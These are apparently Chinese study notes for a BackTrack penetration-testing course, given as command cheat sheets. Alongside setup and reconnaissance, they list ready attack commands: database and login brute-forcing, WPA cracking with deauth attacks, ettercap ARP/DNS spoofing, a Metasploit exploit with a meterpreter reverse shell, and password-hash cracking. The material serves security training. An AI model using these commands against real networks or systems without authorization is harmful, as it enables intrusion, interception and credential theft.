## 目录
* [一、第1课.认识BackTrack渗透测试平台](#一第1课认识BackTrack渗透测试平台)  
* [二、第2课.下载与安装BackTrack平台](#二第2课下载与安装BackTrack平台)
* [三、第3课.打造BackTrack Live USB&CD](#三第3课打造BackTrack Live USBCD)
* [四、第4课.BackTrack环境的基本配置与汉化](#四第4课BackTrack环境的基本配置与汉化)
* [五、第5课.BackTrack远程管理方法-SSH](#五第5课BackTrack远程管理方法SSH)
* [六、第6课.快速熟悉BackTrack图形化界面及渗透测试工具的分类](#六第6课快速熟悉BackTrack图形化界面及渗透测试工具的分类)
* [七、第7课.信息收集-DNS扫描工具的使用](#七第7课信息收集DNS扫描工具的使用)
* [八、第8课.信息收集-主机综合扫描工具的使用](#八第8课信息收集主机综合扫描工具的使用)
* [九、第9课.数据库密码破解工具的使用](#九第9课数据库密码破解工具的使用)
* [十、第10课.Web安全检测工具的使用](#十第10课Web安全检测工具的使用)
* [十一、第11课.无线网络安全检测工具的使用](#十一第11课无线网络安全检测工具的使用)
* [十二、第12课.抓包嗅探工具的使用](#十二第12课抓包嗅探工具的使用)
* [十三、第13课.欺骗攻击工具Ettercap的使用](#十三第13课欺骗攻击工具Ettercap的使用)
* [十四、第14课.初识MetaSploit渗透攻击平台](#十四第14课初识MetaSploit渗透攻击平台)
* [十五、第15课.密码破解工具的使用](#十五第15课密码破解工具的使用)
* [十六、第16课.数字取证工具的使用](#十六、第16课.数字取证工具的使用)


***
### 一、第1课.认识BackTrack渗透测试平台

### 二、第2课.下载与安装BackTrack平台

### 三、第3课.打造BackTrack Live USB&CD

### 四、第4课.BackTrack环境的基本配置与汉化
#### 1、网络配置基本命令
##### 1）查看本地网卡
```
    ifconfig -a
```
##### 2）激活网卡
```
    ifconfig eth0 up
```
##### 3）DHCP网络自动获取IP
```
    dhclient eth0
```
##### 4）手动设置IP
```
    ifconfig eth0 IP netmask 子网掩码
```
##### 5）设置网关
```
    route add default gw 网关地址
```
##### 6）静态IP配置文件
```
    vi /etc/network/interfaces

    iface eth0 inet static
    address IP地址
    netmask 子网掩码
    gateway 网关地址
```
##### 7）DNS配置文件
```
    vi /etc/resolv.conf
```
#### 2、软件安装与系统升级常用命令
##### 1）安装新程序
```
    apt-get install 程序名称
```
##### 2）更新BackTrack系统环境
```
    apt-get update
```
##### 3）更新BackTrack下工具
```
    apt-get upgrade
```
#### 3、其他常用命令
##### 1）字符界面切换至图形界面
```
    startx
```
##### 2）新增用户
```
    adduser 用户名
```
##### 3）修改密码
```
    passwd 用户名
```
##### 4）查看当前所在目录
```
    pwd
```
##### 5）重启/关机
```
    reboot/poweroff
```
#### 4、BackTrack环境汉化
##### 1）安装中文支持模块
```
    apt-get install language-support-zh
```
##### 2）安装语音选择器
```
    apt-get install language-selector
```
##### 4）网页中文输入
```
    搜狗云输入法：http://pinyin.sogou.com/cloud/
    QQ云输入法：http://py.qq.com/web/
```
### 五、第5课.BackTrack远程管理方法-SSH
#### 1、SSH-Secure Shell（安全的远程Shell管理方式）
##### 1）卸载及清除SSH配置信息
```
    apt-get remove openssh-server
```
##### 2）安装OpenSSH程序
```
    apt-get install openssh-server
```
#### 2、VNC-Virtual Network Computing
##### 1）安装VNC程序
```
    apt-get install vnc4server
```
##### 2）设定VNC访问密码（8位）
```
    vncpasswd
```
##### 3）修改VNC远程连接桌面
```
    vi .vnc/xstartup
    //gnome-session &
```
##### 4）建立VNC会话
```
    vncserver
```
### 六、第6课.快速熟悉BackTrack图形化界面及渗透测试工具的分类

### 七、第7课.信息收集-DNS扫描工具的使用
DNS扫描工具可以用来收集的信息：域名注册信息、域名解析服务器（DNS Server）、有效的子域名
#### 1、whois
```
    whois 顶级域名
```
#### 2、dnsenum
```
    ./dnsenum.pl 顶级域名
    ./dnsenum.pl -enum 顶级域名
    ./dnsenum.pl -f dns.txt --dnsserver 8.8.8.8 顶级域名 -o output.txt
```
#### 3、dnsmap
```
    ./dnsmap 顶级域名 -w wordlist_TLAs.txt -r result.txt
```
#### 4、dnswalk
```
    ./dnswalk.pl 顶级域名
```
### 八、第8课.信息收集-主机综合扫描工具的使用
#### 1、tcptraceroute
通过发送TCP/SYN数据包来代替UDP或ICMP应答数据包，可以穿透大多数防火墙
```
    tcptraceroute 域名
    tcptraceroute -q 1 -n 域名
```
#### 2、netenum
```
    netenum 192.168.0.0/24 3 1
```
#### 3、nmap
```
    nmap -sP IP或网段
    //通过发送特定的ICMP报文，根据返回的响应信息来判断主机状态
    nmap -w -sS IP或网段
    //使用SYN半开式扫描方式，快速扫描目标开放的端口
    nmap -O IP或网段
    //通过扫描目标开放的端口，集合nmap内置的操作系统指纹库，识别目标操作系统版本
    nmap -sV IP或网段
    //扫描目标开放端口上运行的服务类型、版本信息
```
#### 4、hping2
可以发送自定义的ICMP、UDP和TCP数据包并接收所有反馈信息。还包含一个小型的路由跟踪模块。此工具可以在常用工具无法对有防火墙保护的主机进行探测时大显身手
```
    hping2 IP
    hping2 -A/F/S -p 某端口 IP或域名
    //-A为设置ACK标志位，-F为设置FIN标志位，-S为设置SYN标志位，-p指定要探测的端口
```
#### 5、genlist
快速扫描活跃主机
```
    genlist -s 192.168.0.\*
```
#### 6、nbtscan
```
    nbtscan 192.168.0.1-254
```
#### 7、xprobe2
主动探测目标操作系统及版本
```
    xprobe2 ip
```
#### 8、amap
扫描并识别目标开放端口上正在运行的服务及版本
```
    amap -v -d IP 端口
```
#### 9、httprint
通过读取http banner数据判断web服务程序及版本
```
    httprint -h IP -s signature.txt
```
#### 10、httsquash
通过读取http banner数据判断web服务程序及版本
```
    httsquash -r IP
```
### 九、第9课.数据库密码破解工具的使用
DBPwAudit-DataBase Password Audit
通过挂载字典对目标数据库进行密码暴力猜解，目前支持的数据库包括SQLServer、MySQL、Oracle、DB2
```
    ./dbpwaudit.sh -s IP -d master -D mssql -U username -P password
    //破解SQLServer数据库命令
    ./dbpwaudit.sh -s IP -d msyql -D mysql -U username -P password
    //破解MySQL数据库命令
```
### 十、第10课.Web安全检测工具的使用
#### 1、Nikto2
使用perl语音写的多平台扫描软件，是一款命令行模式的工具，可以扫描指定主机的WEB类型主机名、特定目录、Cookie、特定CGI漏洞、XSS漏洞、sql注入漏洞、返回主机允许的http方法等安全问题
```
    ./nikto.pl -h 主机IP或域名 -o 扫描结果
    ./nikto.pl -h 主机IP或域名 -p 80,8080
    ./nikto.pl -h 主机IP或域名 -T 扫描类型代码
    ./nikto.pl -h 主机IP或域名 -c -T
    注：扫描类型代码，如下：
    0-检查文件上传页面
    1-检查web日志中可疑的文件或者攻击
    2-检查错误配置或默认文件
    3-检查信息泄露问题
    4-检查注射（XSS/Script/HTML）问题
    5-远程文件索引（从内部根目录中检索是否存在不经授权可访问的文件）
    6-检查拒绝服务问题
    7-远程文件索引（从任意位置检索是否存在不经授权可访问的文件）
    8-检查是否存在系统命令执行漏洞
    9-检查SQL注入
    a-检查认证绕过问题
    b-识别安装的软件版本等
    c-检查源代码泄露问题
    x-反向连接选项
```
#### 2、W3AF
一个用python开发的web安全综合审计平台，通过增加插件来对扩展其功能，支持GUI和命令行两种界面
```
    w3af
    w3af_gui
```
#### 3、Wfuzz
一款用来进行web应用暴力猜解的工具，支持对网站目录、登录信息、应用资源文件等的暴力猜解，还可以进行get及post参数的猜解，sql注入、xss漏洞的测试等。该工具所有功能都依赖于字典
```
    ./wfuzz.py -c -z file -f 字典 --hc 404 --html http://www.xxx.com/FUZZ 2>ok.html
    ./wfuzz.py -c -z range -r 1-100 --hc 404 --html http://www.xxx.com/xxx.asp?id=FUZZ 2>ok.html
    ./wfuzz.py -c -z file -f 字典 -d "login=admin&pwd=FUZZ" --hc 404 http://www.xxx.com/login.php
```
### 十一、第11课.无线网络安全检测工具的使用
#### 1、虚拟机测试注意
* 使用USB无线网卡，在物理机上安装驱动确保正常识别
* 启动"VMware USB Arbitration Service"服务
* 启动虚拟机USB硬件连接支持选项
#### 2、破解WPA/WPA2无线网络密码
```
    ifconfig wlan0 up
    注：激活USB无线网卡
    airmon-ng start wlan0
    注：更改网卡模式为监听模式，改后为mon0
    airodump-ng mon0
    注：探测无线AP情况
    airodump-ng -c 6 -w result mon0
    注：探测并抓包
    aireplay-ng -0 10 -a AP的MAC -c 客户端MAC mon0
    注：对AP实施Deauth攻击，尝试捕获更完整的数据包
    aircrack-ng -w 字典文件 捕获的cap数据包文件
    注：挂载字典破解明文密码
```
### 十二、第12课.抓包嗅探工具的使用
* Wireshark
* dsniff
### 十三、第13课.欺骗攻击工具Ettercap的使用
功能强大的欺骗攻击软件，既可以实现基本的ARP欺骗，也可以实现复杂的中间人攻击
#### 1、使用ettercap实现局域网arp欺骗+中间人攻击
```
    ettercap -G
    打开/etc/etter.conf去掉相应注释信息
    echo 1>/proc/sys/net/ipv4/ip_forward
```
#### 2、使用ettercap实现局域网dns欺骗
```
    ettercap -T -q -i eth1 -P dns_spoof // //
```
### 十四、第14课.初识MetaSploit渗透攻击平台
Metasploit Framework是2003年以开放源代码方式发布、可自由获取的开发框架，这个环境为渗透测试、shellcode编写和漏洞研究提供了一个可靠的平台。它集成了各平台上常见的溢出漏洞和流行的shellcode，并且不断更新，最新版本的MSF包含了上百种当前流行的操作系统和应用软件的exploit，以及100多个shellcode。作为安全工具，它在安全监测中起到不容忽视的作用，并为漏洞自动化探测和及时检测系统漏洞提供有力的保障
```
    use exploit/windows/browser/ms10_046_shortcut_icon_dllloader
    set SRVHOST [ip]
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST [ip]
    exploit

    /usr/local/share/ettercap
    etter.dns

    ettercap -T -q -i interface -P dns_spoof // //
```
### 十五、第15课.密码破解工具的使用
#### 1、Ophcrack
破解windows操作系统密码（彩虹表的方式）
```
    gethash &local >1.txt（打开文件，提取hash）
    ophcrack
    load->table（使用彩虹表）->crack
```
#### 2、Hydra
在线密码暴力破解
```
    xhydra
    target->passwords->tuning
```
#### 3、Crunch
```
    ./crunch 5 5 1234567890 -o pass1.dic
    ./crunch 6 8 charset.lst numeric -o pass2.dic
```
### 十六、第16课.数字取证工具的使用
#### 1、dd
linux下非常有用的工具，作用是用指定大小的块拷贝一个文件，并在拷贝的同时进行指定的转换
```
    dd if=/dev/sda1 of=/dev/hda1/forensic.image
```
#### 2、Foremost
开源的取证工具，可以快速恢复硬盘上已删除的office文档、jpg、pdf等文件
```
    foremost.conf配置文件
    foremost -v -o 丢失数据恢复目录 -c foremost.conf 镜像文件
```
#### 3、Wipe
```
    wipe -i -f -q 要擦除的文件
    wipe -i -Q 擦除次数 要擦除的文件
    wipe -rcf 要擦除的目录
```
